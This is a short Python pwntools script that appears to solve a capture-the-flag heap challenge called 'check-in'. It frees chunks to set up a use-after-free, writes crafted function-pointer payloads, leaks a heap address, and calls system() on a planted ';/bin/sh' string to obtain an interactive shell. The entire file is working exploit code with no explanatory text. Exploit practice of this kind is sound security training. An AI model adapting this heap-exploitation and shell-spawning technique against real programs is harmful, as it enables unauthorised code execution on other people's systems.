from pwn import *
# context(os='linux', arch='i386', log_level='debug')
p = process('./check-in')
elf = ELF('./check-in')


def choice(id_):
    p.recvuntil(b':')
    p.sendline(id_)


def add(size_, mess):
    choice(b'1')
    p.recvuntil(b':')
    p.sendline(size_)
    p.recvuntil(b':')
    p.send(mess)


def delete(id_):
    choice(b'2')
    p.recvuntil(b':')
    p.sendline(id_)


def show(id_):
    choice(b'3')
    p.recvuntil(b':')
    p.sendline(id_)


add(b'32', b'a' * 7 + b';/bin/sh\00')
add(b'16', b'a' * 10)
delete(b'0')
delete(b'1')
payload = p32(0x080488A5) + p32(0x080DCE04)
add(b'8', payload)
show(b'0')
heap_addr = u32(p.recv(4))
print(hex(heap_addr))
bin_addr = heap_addr + 0x18
print(hex(bin_addr))
delete(b'2')
payload = p32(elf.sym['system']) + p32(bin_addr)
add(b'8', payload)
gdb.attach(p, 'b system')
show(b'0')
p.interactive()
